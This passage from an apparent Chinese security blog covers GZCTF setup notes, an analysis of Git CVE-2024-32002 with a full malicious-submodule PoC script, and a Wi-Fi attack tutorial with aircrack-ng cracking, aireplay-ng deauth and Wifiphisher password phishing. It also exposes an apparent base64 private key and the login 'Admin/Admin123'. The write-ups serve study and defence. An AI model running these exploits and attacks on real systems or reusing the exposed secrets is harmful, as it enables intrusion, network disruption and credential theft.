LS0tLS1CRUdJTiBFQyBQUklWQVRFIEtFWS0tLS0tCk1IY0NBUUVFSUVOQUJ1bktoZk5BNzVoUlVrMmF2Y0lHb2xJcXM3Ymp1ckk1aEhRdWNhTEJvQW9HQ0NxR1NNNDkKQXdFSG9VUURRZ0FFY2RnZVhmLzhEYWUvQ00vam5YRzdnTWNLWXBtcnJ5SzJNL0Vna1ptRTB0Z3l0eGxabTl4NQpwanRCYkVPaC84bXBGUE1ZVnkwNUM3QlpJejJqQklqQkh3PT0KLS0tLS1FTkQgRUMgUFJJVkFURSBLRVktLS0tLQo=</span><br></pre></td></tr></table></figure>

<p>配置完成后 启动 gzctf</p>
<p>docker-compose -f  docker-compose.yml up   #前台运行【-d 后台运行】</p>
<p>docker-compose -f  docker-compose.yml stop  #停止</p>
<p>docker-compose -f  docker-compose.yml rm   #删除</p>
<p>Admin/Admin123</p>
<h2 id="题目配置"><a href="#题目配置" class="headerlink" title="题目配置"></a>题目配置</h2><p>部署web pwn</p>
<p><a href="https://blog.csdn.net/qq_52820087/article/details/127851116">https://blog.csdn.net/qq_52820087/article/details/127851116</a></p>
<p>CTF本地靶场搭建——基于阿里云ACR实现动态flag题型的创建</p>
<p><a href="https://developer.aliyun.com/article/1526499">https://developer.aliyun.com/article/1526499</a> </p>
<p>如何优雅的使用Docker出一道动态flag的CTF题-GZCTF</p>
<p><a href="https://sj1t.cn/2024/01/04/%E5%8A%A8%E6%80%81Flag%E5%AE%9E%E7%8E%B0/">https://sj1t.cn/2024/01/04/%E5%8A%A8%E6%80%81Flag%E5%AE%9E%E7%8E%B0/</a></p>
<p>在k3s master中 构建题目 然后上穿到docker中   具体方法参考<a href="https://blog.csdn.net/qq_52820087/article/details/127851116">https://blog.csdn.net/qq_52820087/article/details/127851116</a></p>
<p>目前存在问题  配置的为 k3s主的ip  然后生成的为 主的ip 但是实际上开的所 slave机器的</p>
<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>GZCTF隐藏积分榜记录 <a href="https://www.zhaoj.in/read-8947.html">https://www.zhaoj.in/read-8947.html</a></p>
<p>GZCTF平台对接QQ机器人 <a href="https://www.cnblogs.com/Joooook/p/18152428">https://www.cnblogs.com/Joooook/p/18152428</a></p>
<p><a href="https://github.com/CTF-Archives/GZCTFBOT">https://github.com/CTF-Archives/GZCTFBOT</a></p>
<hr>
<h2 id="开启流量捕获"><a href="#开启流量捕获" class="headerlink" title="开启流量捕获"></a>开启流量捕获</h2><p>捕获队伍解题流量 需开启平台代理</p>
<p>平台代理配置  <a href="https://docs.ctf.gzti.me/zh/guide/platform-proxy">https://docs.ctf.gzti.me/zh/guide/platform-proxy</a></p>
<p>在 appsettings.json 中，找到 ContainerProvider 节点，进行如下配置：</p>
<p>{  “ContainerProvider”: {    “PortMappingType”: “PlatformProxy”,    “EnableTrafficCapture”: false  } }</p>
<p>然后使用 websocket进行连接</p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2024-32002_Git远程代码执行漏洞复现与分析</title>
    <url>/posts/6d847069/</url>
    <content><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul>
<li><p>在开发项目中如果需要想讲两个项目作为独立项目，又想在一个项目中去使用另一个项目，可通过git的子模块来解决这个问题。git 的子模块允许使用一个项目的git仓库时去递归引用另一个项目git仓库的子目录。  一般通过 git submodule命令进行操作 。</p>
</li>
<li><p>post-checkout文件是Git中的一种钩子，在运行git clone或git checkout命令后将会被调用。</p>
</li>
<li><p>在Windows和Mac系统中 不区分大小写，所以在创建文件目录时创建一个 AA 的目录后将无法创建一个名为 aa 的目录。【这个并没有在分析时体现出来，没有相关代码可供分析，POC是通过修复代码中的测试脚本文件去实现的】</p>
<p><img src="/posts/6d847069/image-20240521180326713.png"></p>
</li>
</ul>
<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>  Git是一款免费开源的分布式版本控制系统，支持在多个系统中安装运行，广泛用于协作开发和管理软件项目。在git中提供了许多功能，比如子模块、钩子等，使得git在使用时变得更为灵活。</p>
<p>  在开发项目中如果需要想讲两个项目作为独立项目，又想在一个项目中去使用另一个项目，可通过git的子模块来解决这个问题。git 的子模块允许使用一个项目的git仓库时去递归引用另一个项目git仓库的子目录。  一般通过 git submodule命令进行添加子模块 。</p>
<p>  在使用git clone 命令时， 会根据.gitmodules文件自动克隆hook的子模块，子模块中的post-checkout钩子会被触发。未经身份认证的远程攻击者创建带有特殊子模块和符号链接的恶意存储库，当受害者在git clone时将会触发恶意脚本，从而造成远程代码执行，该漏洞可被用于钓鱼或偷毒，但在Windows中的利用条件较为苛刻（需要管理员权限）。</p>
<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>仅影响Windows和MAC系统下如下版本：</p>
<p>git 2.45.0</p>
<p>git 2.44.0</p>
<p>git 2.43.* &lt; 2.43.4</p>
<p>git 2.42.* &lt; 2.42.2</p>
<p>git 2.41.0</p>
<p>git 2.40.* &lt; 2.40.2</p>
<p>git &lt; 2.39.4</p>
<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>地址：<a href="https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d">https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d</a></p>
<p>在补丁更新中 主要变更了两个文件，一个是文件补丁，另一个则为测试脚本。</p>
<p><img src="/posts/6d847069/image-20240521180423440.png"></p>
<p><img src="/posts/6d847069/image-20240521180629016.png"></p>
<p>在clone_submodule中添加了克隆前进行了判断，如果子模块目录是否存在且为空，如果不为空则会终止。</p>
<p>新加了一个 dir_contains_only_dotgit()函数，主要作用为 检查目录是否仅包含 .git文件后目录，如果存在其他文件或目录则返回错误。</p>
<p>第二个文件更新则为测试脚本</p>
<p>在hook子目录中的post-checkout钩子中写入命令，然后将带有post-chechout钩子的hook仓库作为子模块添加到captiain仓库中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test_expect_success CASE_INSENSITIVE_FS,SYMLINKS \</span><br><span class="line">    &#x27;submodule paths must not follow symlinks&#x27; &#x27;</span><br><span class="line">    # This is only needed because we want to run this in a self-contained</span><br><span class="line">    # test without having to spin up an HTTP server; However, it would not</span><br><span class="line">    # be needed in a real-world scenario where the submodule is simply</span><br><span class="line">    # hosted on a public site.</span><br><span class="line">    test_config_global protocol.file.allow always &amp;&amp;</span><br><span class="line">    # Make sure that Git tries to use symlinks on Windows</span><br><span class="line">    test_config_global core.symlinks true &amp;&amp;</span><br><span class="line">    tell_tale_path=&quot;$PWD/tell.tale&quot; &amp;&amp;</span><br><span class="line">    git init hook &amp;&amp;</span><br><span class="line">    (</span><br><span class="line">        cd hook &amp;&amp;</span><br><span class="line">        mkdir -p y/hooks &amp;&amp;</span><br><span class="line">        write_script y/hooks/post-checkout &lt;&lt;-EOF &amp;&amp;</span><br><span class="line">        echo HOOK-RUN &gt;&amp;2</span><br><span class="line">        echo hook-run &gt;&quot;$tell_tale_path&quot;</span><br><span class="line">        EOF</span><br><span class="line">        git add y/hooks/post-checkout &amp;&amp;</span><br><span class="line">        test_tick &amp;&amp;</span><br><span class="line">        git commit -m post-checkout</span><br><span class="line">    ) &amp;&amp;</span><br><span class="line">    hook_repo_path=&quot;$(pwd)/hook&quot; &amp;&amp;</span><br><span class="line">    git init captain &amp;&amp;</span><br><span class="line">    (</span><br><span class="line">        cd captain &amp;&amp;</span><br><span class="line">        git submodule add --name x/y &quot;$hook_repo_path&quot; A/modules/x &amp;&amp;</span><br><span class="line">        test_tick &amp;&amp;</span><br><span class="line">        git commit -m add-submodule &amp;&amp;</span><br><span class="line">        printf .git &gt;dotgit.txt &amp;&amp;</span><br><span class="line">        git hash-object -w --stdin &lt;dotgit.txt &gt;dot-git.hash &amp;&amp;</span><br><span class="line">        printf &quot;120000 %s 0\ta\n&quot; &quot;$(cat dot-git.hash)&quot; &gt;index.info &amp;&amp;</span><br><span class="line">        git update-index --index-info &lt;index.info &amp;&amp;</span><br><span class="line">        test_tick &amp;&amp;</span><br><span class="line">        git commit -m add-symlink</span><br><span class="line">    ) &amp;&amp;</span><br><span class="line">    test_path_is_missing &quot;$tell_tale_path&quot; &amp;&amp;</span><br><span class="line">    test_must_fail git clone --recursive captain hooked 2&gt;err &amp;&amp;</span><br><span class="line">    grep &quot;directory not empty&quot; err &amp;&amp;</span><br><span class="line">    test_path_is_missing &quot;$tell_tale_path&quot;</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="/posts/6d847069/image-20240521180803937.png"></p>
<p>Windows下在管理员权限下通过Git Bash可复现此漏洞【需要管理员权限！】</p>
<p><img src="/posts/6d847069/image-20240521180819704.png"></p>
<p>POC来源：<a href="https://github.com/amalmurali47/git_rce">https://github.com/amalmurali47/git_rce</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># Set Git configuration options</span><br><span class="line"></span><br><span class="line"># 允许使用file协议</span><br><span class="line">git config --global protocol.file.allow always</span><br><span class="line"># 启用对符合链接的支持</span><br><span class="line">git config --global core.symlinks true</span><br><span class="line"># optional, but I added it to avoid the warning message</span><br><span class="line"># 设置默认分支名 main 避免出现告警信息</span><br><span class="line">git config --global init.defaultBranch main </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 定义标志文件路径</span><br><span class="line"># Define the tell-tale path</span><br><span class="line">tell_tale_path=&quot;$PWD/tell.tale&quot;</span><br><span class="line"></span><br><span class="line"># 初始化hook仓库</span><br><span class="line"># Initialize the hook repository</span><br><span class="line">git init hook</span><br><span class="line">cd hook</span><br><span class="line">mkdir -p y/hooks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 编写恶意hook代码</span><br><span class="line"># Write the malicious code to a hook</span><br><span class="line">cat &gt; y/hooks/post-checkout &lt;&lt;EOF</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;amal_was_here&quot; &gt; /tmp/pwnd</span><br><span class="line">calc.exe</span><br><span class="line">open -a Calculator.app</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"># 设置hook文件的可执行权限</span><br><span class="line"># Make the hook executable: important</span><br><span class="line">chmod +x y/hooks/post-checkout</span><br><span class="line"></span><br><span class="line"># 添加并提交hook</span><br><span class="line">git add y/hooks/post-checkout</span><br><span class="line">git commit -m &quot;post-checkout&quot;</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line"># 定义hook仓库路径</span><br><span class="line"># Define the hook repository path</span><br><span class="line">hook_repo_path=&quot;$(pwd)/hook&quot;</span><br><span class="line"></span><br><span class="line"># 初始化captain仓库</span><br><span class="line"># Initialize the captain repository</span><br><span class="line">git init captain</span><br><span class="line">cd captain</span><br><span class="line"></span><br><span class="line"># 添加 hook仓库作为 子模块 路径为 A/modulesx 名称为 x/y</span><br><span class="line">git submodule add --name x/y &quot;$hook_repo_path&quot; A/modules/x</span><br><span class="line"># 提交子模块更改</span><br><span class="line">git commit -m &quot;add-submodule&quot;</span><br><span class="line"></span><br><span class="line"># Create a symlink</span><br><span class="line"># 创建符合链接</span><br><span class="line">printf &quot;.git&quot; &gt; dotgit.txt</span><br><span class="line"># 计算文件的哈希值</span><br><span class="line">git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash</span><br><span class="line"># 准备索引信息</span><br><span class="line">printf &quot;120000 %s 0\ta\n&quot; &quot;$(cat dot-git.hash)&quot; &gt; index.info</span><br><span class="line"># 更新git索引</span><br><span class="line">git update-index --index-info &lt; index.info</span><br><span class="line"># 提交更改</span><br><span class="line">git commit -m &quot;add-symlink&quot;</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line"># 克隆仓库</span><br><span class="line">git clone --recursive captain hooked</span><br></pre></td></tr></table></figure>

<p>运行<code>git clone --recursive git@github.com:10cks/captain.git</code> 即可远程复现此漏洞</p>
<p><img src="/posts/6d847069/image-20240521180925512.png"></p>
<h3 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h3><h4 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h4><p>目前官方已有可更新版本，建议受影响用户升级至最新版本：</p>
<p>git 2.45.* &gt;= 2.45.1</p>
<p>git 2.44.* &gt;= 2.44.1</p>
<p>git 2.43.* &gt;= 2.43.4</p>
<p>git 2.42.* &gt;= 2.42.2</p>
<p>git 2.41.* &gt;= 2.41.1</p>
<p>git 2.40.* &gt;= 2.40.2</p>
<p>git &gt;= 2.39.4</p>
<p>下载地址：</p>
<p><a href="https://github.com/git/git/tags">https://github.com/git/git/tags</a></p>
<h4 id="缓解方案"><a href="#缓解方案" class="headerlink" title="缓解方案"></a>缓解方案</h4><p>1.在Git中禁用符号链接（<code> git config --global core.symlinks false</code>）</p>
<p>2.避免在不受信任的来源克隆存储库</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://amalmurali.me/posts/git-rce/">https://amalmurali.me/posts/git-rce/</a></p>
<p><a href="https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d">https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d</a></p>
<p><a href="https://github.com/amalmurali47/git_rce">https://github.com/amalmurali47/git_rce</a></p>
<p><a href="https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90">https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90</a></p>
]]></content>
  </entry>
  <entry>
    <title>浅析Wi-Fi安全</title>
    <url>/posts/ae3c8023/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无线安全应用无所不在，企业和个人在使用开放的无线网络时，虽然知道存在安全风险，但仍然依赖于这种网络模式。为了保护用户、设备和服务系统的安全，企业安全团队必须重视无线网络的安全性。了解可能出现的无线网络攻击类型以及采取适当的保护措施至关重要。本篇将简析下Wifi安全的常见攻击手法。</p>
<h3 id="IEEE-802-11"><a href="#IEEE-802-11" class="headerlink" title="IEEE 802.11"></a>IEEE 802.11</h3><p>802.11 体系结构包括几类主要组件， AP(Access Point，无线接入点)、STA(Station，站)、IBSS、BSS、DS、ESS。</p>
<p>802.11标准将所有数据包分为3种：数据、管理、控制</p>
<ul>
<li>数据帧：用于传输用户数据，如文件、视频或音频等。</li>
<li>管理帧：用于管理和维护网络，执行诸如扫描、连接和身份验证等功能。</li>
<li>控制帧：用于控制数据传输过程，包括管理数据传输速率和流动，以及处理碰撞等。</li>
</ul>
<h4 id="协议标准"><a href="#协议标准" class="headerlink" title="协议标准"></a>协议标准</h4><p>在802.11标准中有多种不同的规范，每种规范都提供不同的数据传输速率、频率范围和安全特性。802.11标准已成为最为广泛的WLAN技术，并得到了各种设备的广泛支持。</p>
<ul>
<li>Wi-Fi 1 = IEEE 802.11b：支持2.4GHz频段的无线局域网协议，最高速率为11 Mbps。</li>
<li>Wi-Fi 2 = IEEE 802.11a：支持5GHz频段的无线局域网协议，最高速率为54 Mbps。</li>
<li>Wi-Fi 3 = IEEE 802.11g：支持2.4GHz频段的无线局域网协议，最高速率为54 Mbps。</li>
<li>Wi-Fi 4 = IEEE 802.11n：支持2.4GHz和5GHz频段的无线局域网协议，最高速率为600 Mbps。</li>
<li>Wi-Fi 5 = IEEE 802.11ac：支持5GHz频段的无线局域网协议，最高速率可达1.3 Gbps。</li>
<li>Wi-Fi 6 = IEEE 802.11ax：支持2.4GHz和5GHz频段的无线局域网协议，最高速率可达10 Gbps。</li>
</ul>
<p>2.4GHz与5GHz频段优缺点对比如下：</p>
<p><img src="/posts/ae3c8023/1.png"></p>
<p>在802.11b 802.11g 802.11n标准中，2.4GHz频段被划分为14个信道，1~13信道无需申请可以随意使用。</p>
<p>每个信道的有效带宽为20MHz【实际带宽22MHz，其中2MHz为隔离频带】，相邻信道的中心频点间隔为5MHz，因此在多个信道之间会存在重叠的频率。</p>
<p>干扰最小的新的有3组，可同下图看出（1、6、11  和  2、7、12 和 3、8、13）</p>
<p>图自 《黑客大揭秘：近源渗透测试》</p>
<p><img src="/posts/ae3c8023/2.png"></p>
<h3 id="802-11-加密系统"><a href="#802-11-加密系统" class="headerlink" title="802.11 加密系统"></a>802.11 加密系统</h3><p>无线网络的安全协议通常包括 WEP、WPA、WPA2、WPA3，其中较为安全的是WPA2和WPA3。使用WPA2/WPA3加密可以确保数据传输的安全性，避免被攻击者窃取或篡改。同时在使用时，建议使用高强度密码以增加被破解的难度。</p>
<h4 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h4><p>全称是 Wired Equivalent Privacy，有线等效保密。WEP的核心采用RC4加密，加密密钥长度有64位、128位和152位。</p>
<p>其中有24bit的IV偏移向量，有效密钥长度为40位、104位、128位。IV位于每个802.11帧头部的字段，在加解密过程中使用。</p>
<h4 id="WPA"><a href="#WPA" class="headerlink" title="WPA"></a>WPA</h4><p>全称是 WiFi Protected Access，WiFi访问保护，常用的无线网络认证机制之一。WPA有两种不同的模式：</p>
<ul>
<li>企业模式 WPA-EAP</li>
<li>个人模式 WPA-PSK</li>
</ul>
<p>WPA使用256位密钥，相比于WEP标准中使用的64位和128位密钥，并且在WPA中使用动态密钥加密，破解起来要比WEP困难。在WPA中密码越复杂，安全性越高。</p>
<p>TKIP算法 虽然比起WEP有巨大进步，但是其仍是基于相同的RC4加密算法进行的，也很容易存在相同的问题。</p>
<h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h4><p>WPA2 使用AES加密算法取代了WPA中的RC4，也使用更强完整性校验算法CCMP。</p>
<p>是WPA的高级版本，用两种更强大的加密和身份验证机制取代了RC4和TKIP（临时密钥完整性协议，Temporal Key Integrity Protocol）：AES（advanced encryption standard，高级加密标准） 和分别使用密码块链接消息身份验证代码协议 ( CCMP ) 的计数器模式。</p>
<p>WAP2 对于家庭网络较为使用，但对于企业网络很脆弱。攻击者可以访问使用WPA2保护的网络，访问网络后他们可以访问密码。字典攻击是WPA2密码最容易受到攻击的部分，可以利用</p>
<p>airomon-ng对密码进行破解攻击。</p>
<h4 id="WPA3"><a href="#WPA3" class="headerlink" title="WPA3"></a>WPA3</h4><p>Wi-Fi Protected Access Version 3 Wi-Fi访问保护3代 2018年提出的新安全标准，采用AES-GCMP加密方式，缓解了WPA2中存在的技术缺陷，环境类KRACK攻击和deauth等无线攻击带来的影响，大大提高了配置、身份验证、加密上的安全性。</p>
<p>WAP3有两种安全模式：</p>
<ul>
<li>WAP3个人模式：提供 128 位加密，使用 WPA-PSK/预共享密钥。</li>
<li>WAP3企业模式：提供 192 位加密，使用 AAA/RADIUS 认证服务器。</li>
</ul>
<h3 id="802-11-连接过程"><a href="#802-11-连接过程" class="headerlink" title="802.11 连接过程"></a>802.11 连接过程</h3><p>接入点（AP）和无线客户端之间的连接包含3个过程：扫描、认证、关联。完成安全性校验后 AP向Station 发起四次握手。</p>
<ul>
<li><p>扫描（探测）：Station扫描所在区域存在的802.11网络</p>
<p>Station主动发送Req包，AP收到Req帧后回复Rsp帧</p>
</li>
<li><p>认证：Station与AP进行认证</p>
<p>AP确认 Station是不是802.11设备 确认彼此可以正常通讯</p>
</li>
<li><p>关联： Station与AP进行关联</p>
<p>Station与AP关联以便获得网络的访问权，关联成功后Station会收到AP的响应，包含成功的状态码和关联标识符</p>
</li>
</ul>
<h3 id="WPA-WPA2-四次握手"><a href="#WPA-WPA2-四次握手" class="headerlink" title="WPA/WPA2 四次握手"></a>WPA/WPA2 四次握手</h3><p>无线Wifi的四次握手就是 key exchange的过程。整个过程分为身份认证（authentication）、关联（association）和安全验证（security validation）。四次握手不是直接将密码发送到 AP，而是通过 EAPOL（Extensible authentication protocol over LAN）进行消息交换。下面将简单介绍下四次握手的流程。</p>
<p><img src="/posts/ae3c8023/3.png"></p>
<h4 id="Msg1"><a href="#Msg1" class="headerlink" title="Msg1"></a>Msg1</h4><ul>
<li>AP</li>
</ul>
<p>AP生成一个随机数ANonce 广播发送给Station</p>
<ul>
<li>Sta</li>
</ul>
<p>Sta接收AP发送的随机数ANonce，计算生产PTK(Sta)</p>
<p>提取PTK的前16字节KCK  计算出MIC(Sta)</p>
<h4 id="Msg2"><a href="#Msg2" class="headerlink" title="Msg2"></a>Msg2</h4><ul>
<li>Sta</li>
</ul>
<p>Sta发送SNonce和MIC(sta)给AP</p>
<ul>
<li>AP</li>
</ul>
<p>AP收到Snoce后计算生成PTK(AP)</p>
<p>根据PTK的前16字节KCK 生成MIC(AP)</p>
<p>通过比对MIC(AP)和MIC(Sta)校验来PTK(AP)和PTK(Sta)，如果一致则进行下一步握手</p>
<h4 id="Msg3"><a href="#Msg3" class="headerlink" title="Msg3"></a>Msg3</h4><ul>
<li>AP</li>
</ul>
<p>AP根据GMK、ANonce、AP Mac 生成 GTK，使用PTK中间16字节KCK加密GTK</p>
<p>GTK = PRF(GMK + ANonce + Mac(AA))</p>
<p>根据PTK(AP)前16字节 KCK 生成 MIC(AP)</p>
<p>将加密后的GTK和MIC(AP)发送给Sta</p>
<ul>
<li>Sta</li>
</ul>
<p>验证MIC(AP)与MIC(Sta)</p>
<p>将AP发送的加密后的GTK使用PTK中间16字节KEK进行解密</p>
<h4 id="Msg4"><a href="#Msg4" class="headerlink" title="Msg4"></a>Msg4</h4><ul>
<li>Sta</li>
</ul>
<p>发送最后一次EAPOL-KEY给AP 进行最终认证</p>
<ul>
<li>AP</li>
</ul>
<p>接收Sta发送的EAPOL-KEY进行认证，认证通过则代表握手成功。</p>
<p>如果认证成功 双方将安装各种计算出来的GTK和PTK 完成四次握手。</p>
<h3 id="常见攻击方式"><a href="#常见攻击方式" class="headerlink" title="常见攻击方式"></a>常见攻击方式</h3><h4 id="离线字典攻击"><a href="#离线字典攻击" class="headerlink" title="离线字典攻击"></a>离线字典攻击</h4><p>可通过aircrack-ng 对WPA-PSK 进行密码破解</p>
<p>查看可用的无线网卡 <code>sudo airmon-ng</code></p>
<p><img src="/posts/ae3c8023/4.png"></p>
<p>指定无线网卡开启监听模式 <code>airmon-ng start wlan0</code></p>
<p><img src="/posts/ae3c8023/5.png"></p>
<p>查看网卡是否开启监控 <code>ifconfig </code></p>
<p><img src="/posts/ae3c8023/6.png"></p>
<p>扫描附近的无线网络 <code>sudo airodump-ng wlan0mon</code> </p>
<p><img src="/posts/ae3c8023/7.png"></p>
<blockquote>
<p>BSSID ：无线AP的硬件地址</p>
<p>PWR：信号强度，绝对值越小信号越强。值为负数</p>
<p>CH：无线网络信道</p>
<p>ENC：加密方式</p>
<p>ESSID：无线网络名</p>
</blockquote>
<p>使用参数过滤扫描列表，确定扫描目标</p>
<blockquote>
<p>使用命令：airodump-ng -w &lt;扫描结果保存的文件名&gt; -c &lt;无线网络信道&gt; –bssid &lt;目标无线 AP 的硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo airodump-ng -w output -c 11 --bssid E2:D7:74:C2:F9:44  wlan0mon </span><br></pre></td></tr></table></figure>

<p><img src="/posts/ae3c8023/8.png"></p>
<p>使用aireplay-ng 对目标wifi发起攻击</p>
<blockquote>
<p>使用命令：aireplay-ng -&lt;攻击模式&gt; &lt;攻击次数&gt; -a &lt;无线AP硬件地址&gt; -c &lt;用户设备硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aireplay-ng -0 2 -a E2:D7:74:C2:F9:44 -c 56:D1:E9:EB:EA:2F  wlan0mon</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ae3c8023/9.png"></p>
<p>发起攻击后，当airodump-ng 成功监听到了握手包，退出抓包后可以进行爆破。在桌面下生成了output-01.cap</p>
<p><img src="/posts/ae3c8023/10.png"></p>
<p>使用aircrack-ng 暴力破解wifi密码</p>
<blockquote>
<p>aircrack-ng -w 密码字典 &lt;包含握手包的 cap 文件&gt;</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aircrack-ng -w pass.txt output-01.cap</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ae3c8023/11.png"></p>
<p>这里的密码还需要跟着实际情况去构造，成不成功主要取决于密码字典的强度。</p>
<h4 id="DeAuth-Attack"><a href="#DeAuth-Attack" class="headerlink" title="DeAuth Attack"></a>DeAuth Attack</h4><p>Wifi中断攻击，攻击原理： Wi-Fi关联数据帧没有被加密，导致攻击者可以伪造管理帧，从而让攻击者可以发送人员 取消认证的数据包强行切断AP与客户端之间的连接。</p>
<p>1.查看可用的无线网卡 <code>sudo airmon-ng</code></p>
<p><img src="/posts/ae3c8023/12.png"></p>
<p>2.指定无线网卡开启监听模式 <code>airmon-ng start wlan0</code></p>
<p><img src="/posts/ae3c8023/13.png"></p>
<p>3.airodump-ng wlan0 对当前环境无线网络进行嗅探 根据ESSIS获取攻击目标MAC</p>
<p>扫描附近的无线网络 <code>sudo airodump-ng wlan0mon</code> </p>
<p><img src="/posts/ae3c8023/14.png"></p>
<p>找到测试目标wifi Se及连接手机的MAC地址</p>
<p>WIFI MAC 26:04:1C:39:46:7F</p>
<p>Station MAC  A2:B4:63:18:D6:C2</p>
<p>4.利用 airreplay-ng 进行 DeAuth 攻击</p>
<p>sudo aireplay-ng -0 100 -a 26:04:1C:39:46:7F -c A2:B4:63:18:D6:C2 -D wlan0mon</p>
<p>-0 选择DeAuth攻击模式</p>
<p>-a AP的MAC地址</p>
<p>-c 指定目标机器的mac地址</p>
<p>-D 如果不加的话会报错No such BSSID available.</p>
<p><img src="/posts/ae3c8023/15.png"></p>
<p>攻击成功后 连接目标网络的机器都会被断开连接。</p>
<p><img src="/posts/ae3c8023/16.png"></p>
<h4 id="Wi-Fi-钓鱼"><a href="#Wi-Fi-钓鱼" class="headerlink" title="Wi-Fi 钓鱼"></a>Wi-Fi 钓鱼</h4><p>Wifiphisher</p>
<p>项目地址：<a href="https://github.com/wifiphisher/wifiphisher">https://github.com/wifiphisher/wifiphisher</a></p>
<p>工作原理：</p>
<ul>
<li>嗅探附件无线区域内的AP，并创建一个伪造的AP</li>
<li>Wifiphisher对目标AP连接的所有客户端持续发送大量的解除认证的数据包</li>
<li>向被攻击者推送一个钓鱼页面，要求被攻击者输入密码</li>
</ul>
<p>实例如下：</p>
<p>sudo wifiphisher</p>
<p>然后会探测到周边的网络信号源，然后选择需要攻击的wifi（这里以手机热点MI11为例）</p>
<p><img src="/posts/ae3c8023/17.png"></p>
<p><img src="/posts/ae3c8023/18.png"></p>
<p>接着选择攻击模式，第一项“网络管理器连接“：模拟wifi失败然后需要重新输入密码。</p>
<p><img src="/posts/ae3c8023/19.png"></p>
<p>回车之后会自动跳转到以下</p>
<p><img src="/posts/ae3c8023/20.png"></p>
<p>wifiphisher会发射一个与原wifi相同名称的wifi，如果用户想要重新连接该wifi，会弹出一个重新输入密码的页面。</p>
<p><img src="/posts/ae3c8023/21.png"></p>
<p>如果点击取消会如下如所示，还是伪装的比较真实的。</p>
<p><img src="/posts/ae3c8023/22.png"></p>
<p>当用户输入密码时 我们便通过这种wifi调用的方式得到了wifi密码</p>
<p><img src="/posts/ae3c8023/23.png"></p>
<h4 id="密钥重装攻击"><a href="#密钥重装攻击" class="headerlink" title="密钥重装攻击"></a>密钥重装攻击</h4><p>密钥重装攻击，其本质属于重放攻击，主要是利用 WPA/WPA2 协议在实现上的漏洞，出现在四次握手过程中。当客户端试图连接一个受保护的Wi-Fi网络时，AP将会发起四次握手完成相互认证。其中包含一个 AP 向客户端传输 Msg3 的过程，攻击者可以反复重放这一过程，导致 Nonce 被重置，继而导致传输的数据可以被攻击者解密，这便是 Krack攻击的大致流程。</p>
<p><strong>具体原理分析如下：</strong></p>
<p>在四次握手客户端与AP通信过程中，AP一般称为”Authenticator”，表示认证方；客户端称为”Supplicant”，表示请求方。在四次握手协议中都会生成一个会话密钥 PTK(Pairwise Transit Key)，成对传输密钥，用来加密 AP 和 Station 通讯的单播数据包，AP 与每个 Station 通信用的PTK都是唯一的。PTK的包含五部分：PMK、ANonce、SNonce、Mac(AA)、MAC(SA)，其中ANonce、SNonce为生成的随机数；MAC(AA)、MAC(SA)则为对应两端的MAC地址；PMK为主密钥，与前面四者共同组成PTK，PTK才是整个的用来加密数据的密钥。</p>
<p>客户端在如果要发送明文数据，则需要利用 PTK 和 Nonce 生产一个密钥，这个密钥中的 Nonce 并不是前面提到的 ANonce 或 SNonce，它会随着客户端每发送一个报文，Nonce 就会自动加1， Nonce 和 PTK 混合成为密钥流后，与明文数据进行异或运算便生成了密文数据。</p>
<p>所以在 Krack 攻击过程中 Nonce 重用，也就意味着密钥流重用。在四次握手过程中，客户端收到 AP 发来的 Msg3 后，会按照加密密钥，以用于加密数据帧。如果客户端没有收到 AP发送的 Msg3，AP 会重传 Msg3，但是 Station 并不会根据是否收到 Msg3 进行判断。 在AP重传 Msg3 之前，客户端已经在之前的 Msg4 发送后安装了 PTK，此时客户端肯定会向 AP 发送了加密数据。但由于前面重传 Msg3 导致 Nonce 被重用了，在数据加密时还是采用之前的 Nonce 值，所以客户端传输的两次数据中使用的是同一个 Nonce。</p>
